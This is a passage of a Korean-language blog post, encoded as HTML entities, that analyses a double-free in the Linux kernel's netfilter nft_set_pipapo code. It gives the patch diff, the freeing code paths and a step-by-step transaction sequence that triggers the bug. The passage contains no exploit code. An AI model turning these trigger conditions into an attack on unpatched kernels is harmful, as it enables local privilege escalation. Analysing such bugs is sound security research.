&#xC791;&#xC5C5;)&#xC5D0; &#xB0A8;&#xC544; &#xC788;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xC774; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xC774;&#xD6C4; &#xCF54;&#xB4DC; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xCC38;&#xC870;&#xB418;&#xBA74;, &#xC774;&#xBBF8; &#xD574;&#xC81C;&#xB418;&#xC5B4; &#xB2E4;&#xB978; &#xC6A9;&#xB3C4;&#xB85C; &#xC7AC;&#xD560;&#xB2F9;&#xB418;&#xC5C8;&#xC744; &#xC218; &#xC788;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAC8C; &#xB418;&#xC5B4; &#xC608;&#xCE21; &#xBD88;&#xAC00;&#xB2A5;&#xD55C; &#xB3D9;&#xC791;&#xC774;&#xB098; &#xC2DC;&#xC2A4;&#xD15C; &#xCDA9;&#xB3CC;&#xC744; &#xC77C;&#xC73C;&#xD0B5;&#xB2C8;&#xB2E4;.</li></ol><p>&#xC774;&#xB7EC;&#xD55C; &#xBB38;&#xC81C;&#xB294; &#xD2B9;&#xD788; &#xB137;&#xD544;&#xD130; &#xCEE4;&#xBC0B; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xACFC; <code>nft_set_pipapo</code> &#xAE30;&#xB2A5;&#xC774; &#xD1B5;&#xD569;&#xB41C; &#xC774;&#xD6C4;(commit <code>212ed75dc5fb</code>) &#xB354;&#xC6B1; &#xBCF5;&#xC7A1;&#xD574;&#xC84C;&#xC744; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC804; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xC5B4;&#xBCF4;&#xD2B8; &#xACBD;&#xB85C;&#xC5D0;&#xC11C;&#xC758; &#xC694;&#xC18C; &#xD574;&#xC81C;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574; &#xCD94;&#xAC00;&#xB41C; &#xB85C;&#xC9C1;(commit <code>9827a0e6e23b</code>)&#xC774; &#xC0C8;&#xB85C;&#xC6B4; &#xCEE4;&#xBC0B; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xACFC;&#xC758; &#xC0C1;&#xD638;&#xC791;&#xC6A9; &#xC18D;&#xC5D0;&#xC11C; &#xC758;&#xB3C4;&#xCE58; &#xC54A;&#xC740; &#xBD80;&#xC791;&#xC6A9;&#xC744; &#xC77C;&#xC73C;&#xCF30;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989;, &#xBCF5;&#xC7A1;&#xD55C; &#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xC0C1;&#xD0DC; &#xAD00;&#xB9AC;&#xC640; &#xAC1D;&#xCCB4; &#xC0DD;&#xBA85;&#xC8FC;&#xAE30; &#xAD00;&#xB9AC; &#xB85C;&#xC9C1; &#xC0AC;&#xC774;&#xC758; &#xBBF8;&#xBB18;&#xD55C; &#xB3D9;&#xAE30;&#xD654; &#xBB38;&#xC81C; &#xB610;&#xB294; &#xC124;&#xACC4;&#xC0C1;&#xC758; &#xACB0;&#xD568;&#xC774; Double-Free/UAF&#xB85C; &#xC774;&#xC5B4;&#xC9C4; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><h2 id="&#xCDE8;&#xC57D;&#xD55C;-&#xCF54;&#xB4DC;-&#xBD84;&#xC11D;"><a href="#&#xCDE8;&#xC57D;&#xD55C;-&#xCF54;&#xB4DC;-&#xBD84;&#xC11D;" class="headerlink" title="&#xCDE8;&#xC57D;&#xD55C; &#xCF54;&#xB4DC; &#xBD84;&#xC11D;"></a>&#xCDE8;&#xC57D;&#xD55C; &#xCF54;&#xB4DC; &#xBD84;&#xC11D;</h2><pre><code class="hljs c">--- a/net/netfilter/nft_set_pipapo.c+++ b/net/netfilter/nft_set_pipapo.c@@ <span class="hljs-number">-2329</span>,<span class="hljs-number">8</span> +<span class="hljs-number">2329</span>,<span class="hljs-number">6</span> @@ <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">nft_pipapo_destroy</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct nft_ctx *ctx,</span></span><span class="hljs-function"><span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">        m = rcu_dereference_protected(priv-&gt;match, <span class="hljs-literal">true</span>);</span></span><span class="hljs-function"><span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">  <span class="hljs-keyword">if</span> (m) {</span></span><span class="hljs-function"><span class="hljs-params">   rcu_barrier();</span></span><span class="hljs-function"><span class="hljs-params">-</span></span><span class="hljs-function"><span class="hljs-params">-  nft_set_pipapo_match_destroy(ctx, <span class="hljs-built_in">set</span>, m); <span class="hljs-comment">// [&#xCDE8;&#xC57D;&#xC810; &#xAD00;&#xB828; 1] priv-&gt;match&#xC5D0; &#xB300;&#xD574; &#xD638;&#xCD9C;</span></span></span><span class="hljs-function"><span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">   for_each_possible_cpu(cpu)</span></span><span class="hljs-function"><span class="hljs-params">    pipapo_free_scratch(m, cpu);</span></span><span class="hljs-function"><span class="hljs-params">@@ <span class="hljs-number">-2342</span>,<span class="hljs-number">8</span> +<span class="hljs-number">2340</span>,<span class="hljs-number">7</span> @@ <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> nft_pipapo_destroy(<span class="hljs-keyword">const</span> struct nft_ctx *ctx,</span></span><span class="hljs-function"><span class="hljs-params">  <span class="hljs-keyword">if</span> (priv-&gt;clone) {</span></span><span class="hljs-function"><span class="hljs-params">   m = priv-&gt;clone;</span></span><span class="hljs-function"><span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">-  <span class="hljs-keyword">if</span> (priv-&gt;dirty) <span class="hljs-comment">// [&#xCDE8;&#xC57D;&#xC810; &#xAD00;&#xB828; 2] priv-&gt;dirty &#xD50C;&#xB798;&#xADF8; &#xD655;&#xC778;</span></span></span><span class="hljs-function"><span class="hljs-params">-   nft_set_pipapo_match_destroy(ctx, <span class="hljs-built_in">set</span>, m); <span class="hljs-comment">// [&#xCDE8;&#xC57D;&#xC810; &#xAD00;&#xB828; 3] priv-&gt;clone&#xC5D0; &#xB300;&#xD574; &#xD638;&#xCD9C;</span></span></span><span class="hljs-function"><span class="hljs-params">+  nft_set_pipapo_match_destroy(ctx, <span class="hljs-built_in">set</span>, m); <span class="hljs-comment">// &#xD328;&#xCE58;&#xB41C; &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; &#xC774; &#xB77C;&#xC778;&#xB9CC; &#xB0A8;&#xC74C;</span></span></span><span class="hljs-function"><span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">   for_each_possible_cpu(cpu)</span></span><span class="hljs-function"><span class="hljs-params">    pipapo_free_scratch(priv-&gt;clone, cpu);</span></span></code></pre><p>&#xC774; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; <code>priv-&gt;clone</code>&#xC774; &#xC874;&#xC7AC;&#xD558;&#xACE0; <code>priv-&gt;dirty</code> &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA74;, <code>nft_set_pipapo_match_destroy</code> &#xD568;&#xC218;&#xAC00; <code>priv-&gt;match</code>&#xC5D0; &#xB300;&#xD574; &#xD55C; &#xBC88; (&#xC81C;&#xAC70;&#xB41C; &#xB77C;&#xC778;), &#xADF8;&#xB9AC;&#xACE0; <code>priv-&gt;clone</code>&#xC5D0; &#xB300;&#xD574; &#xB610; &#xD55C; &#xBC88; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xAC83;&#xC774; Double-Free&#xC758; &#xC9C1;&#xC811;&#xC801;&#xC778; &#xC6D0;&#xC778;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">nft_set_pipapo_match_destroy</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct nft_ctx *ctx,</span></span><span class="hljs-function"><span class="hljs-params">                                         <span class="hljs-keyword">const</span> struct nft_set *<span class="hljs-built_in">set</span>,</span></span><span class="hljs-function"><span class="hljs-params">                                         struct nft_pipapo_match *m)</span></span><span class="hljs-function"></span>{    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_pipapo_field</span> *<span class="hljs-title">f</span>;</span>    <span class="hljs-keyword">int</span> i, r;    <span class="hljs-comment">// &#xB9C8;&#xC9C0;&#xB9C9; &#xD544;&#xB4DC;(field_count - 1)&#xB97C; &#xCC3E;&#xC74C;</span>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>, f = m-&gt;f; i &lt; m-&gt;field_count - <span class="hljs-number">1</span>; i++, f++)        ;    <span class="hljs-comment">// &#xB9C8;&#xC9C0;&#xB9C9; &#xD544;&#xB4DC;&#xC758; &#xBAA8;&#xB4E0; &#xADDC;&#xCE59;(rules)&#xC744; &#xC21C;&#xD68C;</span>    <span class="hljs-keyword">for</span> (r = <span class="hljs-number">0</span>; r &lt; f-&gt;rules; r++) {        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_pipapo_elem</span> *<span class="hljs-title">e</span>;</span>        <span class="hljs-comment">// &#xB3D9;&#xC77C;&#xD55C; &#xC694;&#xC18C;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC5F0;&#xC18D;&#xB41C; &#xADDC;&#xCE59;&#xC740; &#xAC74;&#xB108;&#xB700; (&#xC911;&#xBCF5; &#xCC98;&#xB9AC; &#xBC29;&#xC9C0;)</span>        <span class="hljs-keyword">if</span> (r &lt; f-&gt;rules - <span class="hljs-number">1</span> &amp;&amp; f-&gt;mt[r + <span class="hljs-number">1</span>].e == f-&gt;mt[r].e)            <span class="hljs-keyword">continue</span>;        e = f-&gt;mt[r].e; <span class="hljs-comment">// &#xC694;&#xC18C;(element) &#xD3EC;&#xC778;&#xD130; &#xAC00;&#xC838;&#xC624;&#xAE30;</span>        <span class="hljs-comment">// &#xC694;&#xC18C;&#xB97C; &#xD30C;&#xAD34;&#xD558;&#xB294; &#xD568;&#xC218; &#xD638;&#xCD9C;</span>        nf_tables_set_elem_destroy(ctx, <span class="hljs-built_in">set</span>, &amp;e-&gt;priv);    }}</code></pre><p>&#xC774; &#xD568;&#xC218;&#xB294; &#xC8FC;&#xC5B4;&#xC9C4; <code>nft_pipapo_match</code> &#xAC1D;&#xCCB4;(<code>m</code>) &#xB0B4;&#xC758; &#xC694;&#xC18C;(<code>nft_pipapo_elem</code>)&#xB4E4;&#xC744; &#xC21C;&#xD68C;&#xD558;&#xBA70;, &#xAC01; &#xC694;&#xC18C;&#xC5D0; &#xB300;&#xD574; <code>nf_tables_set_elem_destroy</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; free&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">nf_tables_set_elem_destroy</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct nft_ctx *ctx,</span></span><span class="hljs-function"><span class="hljs-params">                                <span class="hljs-keyword">const</span> struct nft_set *<span class="hljs-built_in">set</span>,</span></span><span class="hljs-function"><span class="hljs-params">                                <span class="hljs-keyword">const</span> struct nft_elem_priv *elem_priv)</span></span><span class="hljs-function"></span>{    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_set_ext</span> *<span class="hljs-title">ext</span> = <span class="hljs-title">nft_set_elem_ext</span>(<span class="hljs-title">set</span>, <span class="hljs-title">elem_priv</span>);</span>    <span class="hljs-comment">// &#xC694;&#xC18C;&#xC5D0; &#xC5F0;&#xACB0;&#xB41C; &#xD45C;&#xD604;&#xC2DD;(expressions)&#xC774; &#xC788;&#xC73C;&#xBA74; &#xD574;&#xC81C;</span>    <span class="hljs-keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_EXPRESSIONS))        nft_set_elem_expr_destroy(ctx, nft_set_ext_expr(ext));    <span class="hljs-comment">// &#xC694;&#xC18C;&#xC758; private &#xB370;&#xC774;&#xD130;(elem_priv) &#xBA54;&#xBAA8;&#xB9AC; &#xD574;&#xC81C;</span>    kfree(elem_priv); <span class="hljs-comment">// *** Double-Free &#xBC1C;&#xC0DD; &#xC9C0;&#xC810; ***</span>}</code></pre><p>&#xC774; &#xD568;&#xC218;&#xB294; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; <code>kfree(elem_priv)</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xC694;&#xC18C;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; free&#xD569;&#xB2C8;&#xB2E4;. <code>nft_pipapo_destroy</code>&#xC5D0;&#xC11C; <code>nft_set_pipapo_match_destroy</code>&#xAC00; &#xB450; &#xBC88; &#xD638;&#xCD9C;&#xB418;&#xBA74;, &#xB3D9;&#xC77C;&#xD55C; <code>elem_priv</code>&#xC5D0; &#xB300;&#xD574; &#xC774; <code>kfree</code>&#xAC00; &#xB450; &#xBC88; &#xC2E4;&#xD589;&#xB418;&#xC5B4; Double-Free&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>&#xAD00;&#xB828; &#xC8FC;&#xC694; &#xC790;&#xB8CC;&#xAD6C;&#xC870; &#xBC0F; &#xBCC0;&#xC218;:</strong></p><ul><li><code>struct nft_set</code>: &#xB137;&#xD544;&#xD130; &#xC9D1;&#xD569;&#xC758; &#xACF5;&#xD1B5; &#xD5E4;&#xB354; &#xAD6C;&#xC870;&#xCCB4;&#xC785;&#xB2C8;&#xB2E4;.</li><li><code>struct nft_pipapo_set</code>: PIPAPO &#xC9D1;&#xD569;&#xC758; &#xB0B4;&#xBD80; &#xC0C1;&#xD0DC; &#xAD00;&#xB9AC; &#xAD6C;&#xC870;&#xCCB4;&#xC785;&#xB2C8;&#xB2E4;. <code>match</code> (&#xD604;&#xC7AC; &#xCEE4;&#xBC0B;&#xB41C; &#xBDF0;), <code>clone</code> (&#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xC911; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xC774; &#xBC18;&#xC601;&#xB418;&#xB294; &#xBDF0;), <code>dirty</code> (&#xBCC0;&#xACBD; &#xC5EC;&#xBD80; &#xD50C;&#xB798;&#xADF8;) &#xD3EC;&#xC778;&#xD130;/&#xBA64;&#xBC84;&#xB97C; &#xD3EC;&#xD568;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>struct nft_pipapo_match</code>: PIPAPO &#xC9D1;&#xD569; &#xC694;&#xC18C;&#xB4E4;&#xC758; &#xBDF0;(view)&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xAC1D;&#xCCB4;&#xC785;&#xB2C8;&#xB2E4;. <code>priv-&gt;match</code>&#xC640; <code>priv-&gt;clone</code>&#xC740; &#xC774; &#xD0C0;&#xC785;&#xC758; &#xD3EC;&#xC778;&#xD130;&#xC785;&#xB2C8;&#xB2E4;. <code>clone</code>&#xC740; &#xCEE4;&#xBC0B;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xC744; &#xD3EC;&#xD568;&#xD55C; &#xBDF0;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><code>struct nft_pipapo_elem</code>: PIPAPO &#xC9D1;&#xD569;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xAC1C;&#xBCC4; &#xC694;&#xC18C;&#xC785;&#xB2C8;&#xB2E4;. <code>priv</code> &#xBA64;&#xBC84;&#xB97C; &#xD1B5;&#xD574; <code>nft_elem_priv</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#xC811;&#xADFC;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>struct nft_elem_priv</code>: &#xC9D1;&#xD569; &#xC694;&#xC18C;&#xC758; private &#xB370;&#xC774;&#xD130;&#xC785;&#xB2C8;&#xB2E4;. <code>kfree</code> &#xB300;&#xC0C1;&#xC774; &#xB418;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC785;&#xB2C8;&#xB2E4;.</li><li><code>priv-&gt;dirty</code>: <code>nft_pipapo_set</code>&#xC758; &#xBA64;&#xBC84; &#xBCC0;&#xC218;&#xB85C;, &#xD604;&#xC7AC; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xC9D1;&#xD569;&#xC5D0; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xC774; &#xC788;&#xC5C8;&#xB294;&#xC9C0; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xBD88;&#xB9AC;&#xC5B8;(boolean) &#xD50C;&#xB798;&#xADF8;&#xC785;&#xB2C8;&#xB2E4;. <code>nft_pipapo_insert</code> &#xB4F1;&#xC5D0;&#xC11C; <code>true</code>&#xB85C; &#xC124;&#xC815;&#xB418;&#xACE0;, <code>nft_pipapo_commit</code>&#xC5D0;&#xC11C; <code>false</code>&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xB429;&#xB2C8;&#xB2E4;.</li><li><code>set-&gt;dead</code>: <code>nft_set</code>&#xC758; &#xBA64;&#xBC84; &#xBCC0;&#xC218;&#xB85C;, &#xD574;&#xB2F9; &#xC9D1;&#xD569;&#xC774; &#xC0AD;&#xC81C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xD45C;&#xC2DC;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xD50C;&#xB798;&#xADF8;&#xC785;&#xB2C8;&#xB2E4;. <code>NFT_MSG_DELSET</code> &#xB610;&#xB294; <code>NFT_MSG_DESTROYSET</code> &#xBA54;&#xC2DC;&#xC9C0; &#xCC98;&#xB9AC; &#xC2DC; &#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4;.</li></ul><h2 id="&#xD2B8;&#xB9AC;&#xAC70;"><a href="#&#xD2B8;&#xB9AC;&#xAC70;" class="headerlink" title="&#xD2B8;&#xB9AC;&#xAC70;"></a>&#xD2B8;&#xB9AC;&#xAC70;</h2><p>&#xD2B8;&#xB9AC;&#xACE0; &#xC870;&#xAC74;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xCEE4;&#xBC0B; &#xACBD;&#xB85C;(commit path)&#xC758; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xC744; &#xD1B5;&#xD574; &#xB9CC;&#xC871;&#xB429;&#xB2C8;&#xB2E4;.</p><ol><li><p><strong><code>priv-&gt;dirty</code> &#xD50C;&#xB798;&#xADF8; &#xC124;&#xC815;:</strong> &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xB0B4;&#xC5D0;&#xC11C; <code>nft_pipapo_insert</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xC9D1;&#xD569;&#xC5D0; &#xC694;&#xC18C;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xBA74;, &#xD574;&#xB2F9; &#xC9D1;&#xD569;&#xC758; <code>priv-&gt;dirty</code> &#xD50C;&#xB798;&#xADF8;&#xAC00; <code>true</code>&#xB85C; &#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xCEE4;&#xBC0B; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xC774; &#xC9D1;&#xD569;&#xC758; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xC744; &#xBC18;&#xC601;&#xD574;&#xC57C; &#xD568;&#xC744; &#xC54C;&#xB9BD;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">nft_pipapo_insert</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct net *net, <span class="hljs-keyword">const</span> struct nft_set *<span class="hljs-built_in">set</span>,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">const</span> struct nft_set_elem *elem,</span></span><span class="hljs-function"><span class="hljs-params">        struct nft_elem_priv **elem_priv)</span></span><span class="hljs-function"></span>{[...] priv-&gt;dirty = <span class="hljs-literal">true</span>;[...]}</code></pre></li><li><p><strong><code>set-&gt;dead</code> &#xD50C;&#xB798;&#xADF8; &#xC124;&#xC815;:</strong> &#xB3D9;&#xC77C;&#xD55C; &#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xB0B4;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD574;&#xB2F9; &#xC9D1;&#xD569;&#xC744; &#xC0AD;&#xC81C;&#xD558;&#xB3C4;&#xB85D; &#xC694;&#xCCAD;(<code>NFT_MSG_DELSET</code> &#xB610;&#xB294; <code>NFT_MSG_DESTROYSET</code> &#xBA54;&#xC2DC;&#xC9C0; &#xC0AC;&#xC6A9;[1])&#xD558;&#xBA74;, <code>nf_tables_commit</code> &#xD568;&#xC218; &#xB0B4;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xC9D1;&#xD569;&#xC758; <code>set-&gt;dead</code> &#xD50C;&#xB798;&#xADF8;&#xAC00; <code>true</code>&#xB85C; &#xC124;&#xC815;[2]&#xB429;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">nf_tables_commit</span><span class="hljs-params">(struct net *net, struct sk_buff *skb)</span></span><span class="hljs-function"></span>{[...]  <span class="hljs-keyword">case</span> NFT_MSG_DELSET:  <span class="hljs-keyword">case</span> NFT_MSG_DESTROYSET: <span class="hljs-comment">// [1]</span>   nft_trans_set(trans)-&gt;dead = <span class="hljs-number">1</span>; <span class="hljs-comment">// [2]</span>   list_del_rcu(&amp;nft_trans_set(trans)-&gt;<span class="hljs-built_in">list</span>);   nf_tables_set_notify(&amp;trans-&gt;ctx, nft_trans_set(trans),          trans-&gt;msg_type, GFP_KERNEL);   <span class="hljs-keyword">break</span>;  <span class="hljs-keyword">case</span> NFT_MSG_NEWSETELEM: <span class="hljs-comment">// [3]</span>[...]   <span class="hljs-keyword">if</span> (te-&gt;<span class="hljs-built_in">set</span>-&gt;ops-&gt;commit &amp;&amp;       list_empty(&amp;te-&gt;<span class="hljs-built_in">set</span>-&gt;pending_update)) {    list_add_tail(&amp;te-&gt;<span class="hljs-built_in">set</span>-&gt;pending_update,           &amp;set_update_list);   }[...] } nft_set_commit_update(&amp;set_update_list);[...] nf_tables_commit_release(net); <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></li><li><p><strong><code>-&gt;commit()</code> &#xBA54;&#xC18C;&#xB4DC; &#xAC74;&#xB108;&#xB6F0;&#xAE30;:</strong> <code>nf_tables_commit</code> &#xD568;&#xC218;&#xB294; &#xC774;&#xD6C4; <code>nft_set_commit_update</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xBCC0;&#xACBD;&#xB41C; &#xC9D1;&#xD569;&#xB4E4;&#xC758; <code>-&gt;commit()</code> &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; <code>nft_set_commit_update</code> &#xD568;&#xC218;&#xB294; <code>set-&gt;dead</code> &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xC124;&#xC815;&#xB41C; &#xC9D1;&#xD569;[4]&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB294; <code>-&gt;commit()</code> &#xBA54;&#xC18C;&#xB4DC; &#xD638;&#xCD9C;&#xC744; &#xAC74;&#xB108;&#xB701;&#xB2C8;&#xB2E4;[5]. &#xC774;&#xB294; &#xC0AD;&#xC81C;&#xB420; &#xC9D1;&#xD569;&#xC5D0; &#xB300;&#xD574; &#xBD88;&#xD544;&#xC694;&#xD55C; &#xCEE4;&#xBC0B; &#xC791;&#xC5C5;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD568;&#xC785;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">nft_set_commit_update</span><span class="hljs-params">(struct list_head *set_update_list)</span></span><span class="hljs-function"></span>{ <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_set</span> *<span class="hljs-title">set</span>, *<span class="hljs-title">next</span>;</span> list_for_each_entry_safe(<span class="hljs-built_in">set</span>, next, set_update_list, pending_update) {  list_del_init(&amp;<span class="hljs-built_in">set</span>-&gt;pending_update);  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">set</span>-&gt;ops-&gt;commit || <span class="hljs-built_in">set</span>-&gt;dead) <span class="hljs-comment">// [4]</span>   <span class="hljs-keyword">continue</span>;  <span class="hljs-built_in">set</span>-&gt;ops-&gt;commit(<span class="hljs-built_in">set</span>); <span class="hljs-comment">// [5]</span> }}</code></pre></li><li><p><strong><code>priv-&gt;dirty</code> &#xD50C;&#xB798;&#xADF8; &#xC720;&#xC9C0;:</strong> <code>nft_set_pipapo</code>&#xC758; <code>-&gt;commit()</code> &#xBA54;&#xC18C;&#xB4DC;(<code>nft_pipapo_commit</code>)&#xB294; <code>priv-&gt;dirty</code> &#xD50C;&#xB798;&#xADF8;&#xB97C; <code>false</code>&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; 3&#xB2E8;&#xACC4;&#xC5D0;&#xC11C; <code>-&gt;commit()</code> &#xBA54;&#xC18C;&#xB4DC;&#xAC00; &#xAC74;&#xB108;&#xB6F0;&#xC5B4;&#xC84C;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, <code>priv-&gt;dirty</code> &#xD50C;&#xB798;&#xADF8;&#xB294; <code>true</code> &#xC0C1;&#xD0DC;&#xB85C; &#xC720;&#xC9C0;&#xB429;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">nft_pipapo_commit</span><span class="hljs-params">(struct nft_set *<span class="hljs-built_in">set</span>)</span></span><span class="hljs-function"></span>{[...] <span class="hljs-keyword">if</span> (!priv-&gt;dirty)  <span class="hljs-keyword">return</span>;[...] priv-&gt;dirty = <span class="hljs-literal">false</span>;[...]}</code></pre></li><li><p><strong><code>-&gt;destroy()</code> &#xBA54;&#xC18C;&#xB4DC; &#xD638;&#xCD9C;:</strong> &#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xCC98;&#xB9AC; &#xB9C8;&#xC9C0;&#xB9C9; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; <code>nf_tables_commit_release</code> &#xD568;&#xC218;&#xB294; &#xC0AD;&#xC81C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xD45C;&#xC2DC;&#xB41C; &#xAC1D;&#xCCB4;&#xB4E4;&#xC744; &#xD574;&#xC81C;&#xD558;&#xAE30; &#xC704;&#xD574; <code>nft_commit_release</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0;, &#xC774;&#xB294; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; <code>nft_set_destroy</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xC9D1;&#xD569;&#xC758; <code>-&gt;destroy()</code> &#xBA54;&#xC18C;&#xB4DC;(<code>nft_pipapo_destroy</code>)&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">nf_tables_commit_release</span><span class="hljs-params">(struct net *net)</span></span><span class="hljs-function"></span>{[...] schedule_work(&amp;trans_destroy_work);[...]}[...]<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">nf_tables_trans_destroy_work</span><span class="hljs-params">(struct work_struct *w)</span></span><span class="hljs-function"></span>{[...] list_for_each_entry_safe(trans, next, &amp;head, <span class="hljs-built_in">list</span>) {  nft_trans_list_del(trans);  nft_commit_release(trans); }}[...]<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">nft_commit_release</span><span class="hljs-params">(struct nft_trans *trans)</span></span><span class="hljs-function"></span>{ <span class="hljs-keyword">switch</span> (trans-&gt;msg_type) {[...] <span class="hljs-keyword">case</span> NFT_MSG_DELSET: <span class="hljs-keyword">case</span> NFT_MSG_DESTROYSET:  